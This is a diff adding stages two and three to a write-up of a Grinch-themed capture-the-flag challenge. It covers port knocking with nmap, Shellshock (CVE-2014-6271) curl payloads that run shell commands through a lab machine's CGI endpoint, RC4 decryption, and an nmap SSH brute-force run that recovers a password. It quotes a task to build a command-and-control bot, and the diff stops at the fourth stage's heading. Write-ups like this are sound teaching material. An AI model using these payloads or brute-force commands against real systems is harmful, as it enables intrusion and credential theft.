@@ -75,7 +75,7 @@ Hint: MzcgMzAgMzAgMzAgMmMgMzggMzAgMzAgMzAgMmMgMzkgMzAgMzAgMzAgMmMgMzEgMzAgMzAgMz
 <Grinch> This is the end of stage 1. You rock!
 ```
 
-## Second stage
+## ⚡️ Second stage
 
 Okay great. The first stage ends with the message includes some hints and ciphers. We now have some number that looks kind of random, but it definitely hides some piece of information. One of the first things I personally do if I don't know I use Google search. Let's try to find `3232235903` on Google and see.
 
@@ -165,3 +165,132 @@ We have a remaining ports `902` and `6667`. On port `902` is another ssh-agent. 
 ```
 
 Uhhh. No ports are remaining, and we still have no hint of what to do. Let's go back to hint from previous stage. Try to deeper analyze the text.
+
+After reading hint over and over, I realized that the phrase `Knock knock...` may lead to [Port Knocking](https://wiki.archlinux.org/index.php/Port_knocking) technic, which is a technic for hiding ports from external access. The ports are simply opened after some "knock-knock" sequential of requests to the firewall. This idea well corresponds to port hint, which is `7000,8000,9000,10000`. Is this possible key to open hidden doors?
+
+Let's send a simple port knocking sequence:
+
+```bash
+for x in 7000 8000 9000 10000;
+    do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.1.127;
+done
+```
+
+and another port scan to find out what happened:
+
+```bash
+Nmap scan report for 192.168.1.127
+Host is up (-0.0022s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+902/tcp  open  iss-realsecure
+6667/tcp open  irc
+8080/tcp open  http-proxy
+8081/tcp open  blackice-icecap
+MAC Address: 08:00:27:06:8F:03 (Oracle VirtualBox virtual NIC)
+```
+
+Bingo. New port opens! Make GET request to this port response HTML page contains this: 
+
+```html
+This is a vulnerable web application for showcasing CVE 2014-6271, a.k.a. Shellshock.</br>
+</br>
+Vulnerability as a Service, brought to you by <a href="https://hml.io/" target="_blank">https://hml.io/</a>.</br>
+</br>
+For further details please see <a href="https://github.com/hmlio/vaas-cve-2014-6271" target="_blank">https://github.com/hmlio/vaas-cve-2014-6271</a>.</br>
+</br>
+```
+
+Here we have a demo for CVE 2014-6271 with a helpful link to complete documentation and source codes. Oh, I really like beautiful, bright, and simple documentations.
+
+![img03](img/img03.png)
+
+By this exploitation, I gain access to the shell of this Docker container. After a quick look around, I'm more familiar with this tool and find the home directory of the user `grinch`.
+
+```bash
+$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /home/grinch'" http://192.168.1.127:8080/cgi-bin/stats
+
+XmasPresent.txt
+
+$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/grinch/XmasPresent.txt'" http://192.168.1.127:8080/cgi-bin/stats
+
+“Maybe Christmas (he thought) doesn’t come from a store. Maybe Christmas perhaps means a little bit more.” — The Grinch
+```
+
+After listing, I open the only one file in this directory and... Thank you, Grinch. But this is just one part. I need more.
+
+Let's list more thoroughly.
+
+```bash
+$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls -la /home/grinch'" http://192.168.1.127:8080/cgi-bin/stats
+
+-rw-rw-r-- 1 1000 1000  350 Dec 20 14:30 .trmaljak.txt
+-rw-rw-r-- 1 1000 1000  128 Dec 20 16:18 XmasPresent.txt
+
+$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/grinch/.trmaljak.txt'" http://192.168.1.127:8080/cgi-bin/stats
+
+[a-zA-Z0-9]{3} symetric:
+22c03696b86ea94519f339f1ce9810aa61392e9f0622512771be0abcdf1b54afb1314906793c7f67f72f82739f313ce67b4daff7d87f880e78ff1cd54723507006a3dbc6f11abcaa8658fd1a5913eafccb618afc21263a1262460197150c9a7c49704719e87bb263737d5b94c6f5f6e1045bede72a5ff86dedec93a967b444bea0564f7fae3131ee2838c9f5eab125af3992c742d872cf18fa31766f999827ca49
+```
+
+Yes. This is what we are looking for. The first thing which attracts my attention is the word `symmetric`. This message is probably some kind of cipher that belongs to a group of symmetric ciphers. This part takes a long time to guess which cryptography algorithm it is. One of the brainstorm ways was the hint point to passphrase of length, which matches this regex `[a-zA-Z0-9]`, but this a lot of words, and we still do not know the algorithm. And then I thought - regex points to algorithm name and not on passphrase pattern.
+
+I'm searching on the internet for all possible algorithms, and the first algorithm on [Wikipedia](https://en.wikipedia.org/wiki/Symmetric-key_algorithm), which match this regex is `RC4`. Let's see what we get. Because the text was unique for each of us, the passphrase must also be unique, it leads to use my private token as a passphrase and BINGO! We are at the end of the second stage.
+
+![img04](img/img04.png)
+
+## ⚡️ Third stage
+
+From the previous stage, we bring just a text from the picture above. This part was really frustrating, even though the text speaks more or less clear speech. However, we spend a lot of time thinking about what to do. After hours of desperation, we are trying to run brute force to ssh port `22` with built-in users and passwords combinations from Nmap library. The result? Nothing.
+
+And then it came the additional hint from Ondřej:
+
+```text
+- When in doubts, try to roll back and see what have you discovered during the previous stages.
+- Sometimes you have to use force to get things going. If that is not enough, use more force.
+- When running scripts with nmap, be sure it doesn't stop prematurely. 'unpwdb.timelimit' might be useful for that
+- Choose your words carefully. If used properly, you shouldn't need more than 20000 of them.
+- Speaking of which, take hints from the master lyrist here: https://www.youtube.com/watch?v=y3Ca3c6J9N4
+```
+
+Now it is crystal clear. The brute force is actually a solution but using a huge password dictionary called `rockyou`. So we are creating Nmap command and start brute force again. It is a built-in script from Nmap library with the custom user and password databases. User, in this case, is `joy` from the text hint.
+
+```bash
+$ nmap -sS -sV -p 22 192.168.1.127 -v -n --script ssh-brute --script-args
+s userdb=users,passdb=1000000.txt,brute.firstonly=true,unpwdb.timelimit=0
+```
+
+after while we have results:
+
+```text
+| ssh-brute:
+|   Accounts:
+|     joy:leicester - Valid credentials
+|_  Statistics: Performed 11893 guesses
+```
+
+Now we can log in and look at what is in my home.
+
+```bash
+joy@grinchLair: ~ $ ls
+Stocking
+
+joy@grinchLair: ~$ cat Stocking
+
+For Final stage (Stage 4) you should desing and implement a C&C bot using the github repo/github gist(https://gist.github.com/).
+Design your bot such that it can perform following tasks in the target machine:
+
+	* List files in specified directory
+	* List active users
+	* List running processes
+	* Action of your own choice (Describe in the report)
+
+And report results back to the control server.
+
+Good luck and Merry Xmas!
+```
+
+And it is done. This stage was short in terms of work but not in terms of spend time.
+
+## ⚡️ Fourth stage
